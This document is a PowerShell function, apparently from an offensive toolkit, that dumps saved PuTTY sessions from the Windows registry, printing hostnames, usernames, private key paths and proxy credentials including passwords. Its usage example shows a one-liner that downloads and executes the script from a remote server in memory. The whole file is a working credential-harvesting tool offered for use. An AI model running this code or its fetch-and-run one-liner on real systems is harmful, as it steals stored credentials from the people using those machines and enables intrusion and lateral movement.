function Get-PuttyKeys {
<# 

.SYNOPSIS
Dumps any saved putty sessions/keys/passwords.

.EXAMPLE

PS> . .\Get-PuttyKeys; Get-PuttyKeys

C:\> powershell "iex (New-Object Net.Webclient).Downloadstring('https://server/Get-PuttyKeys.ps1'); Get-PuttyKeys

Author: (@0rbz_)

#>
	
	$SavedSessions = (Get-Item HKCU:\Software\SimonTatham\PuTTY\Sessions\*).Name | ForEach-Object { $_.split("\")[5]}
		
	foreach ($Session in $SavedSessions) {
			
		$HostName = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).Hostname
		$PrivateKey = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).PublicKeyFile
		$Username = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).UserName
		$ProxyHost = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyHost
		$ProxyPassword = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPassword
		$ProxyPort = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyPort
		$ProxyUsername = (Get-ItemProperty HKCU:\Software\SimonTatham\PuTTY\Sessions\$Session).ProxyUsername
		$Results = "`nSession Name: $Session`nHostname/IP: $HostName`nUserName: $UserName`nPrivate Key: $PrivateKey`nProxy Host: $ProxyHost`nProxy Port: $ProxyPort`nProxy Username: $ProxyUsername`nProxy Password: $ProxyPassword"

		Write $Results
	}
}
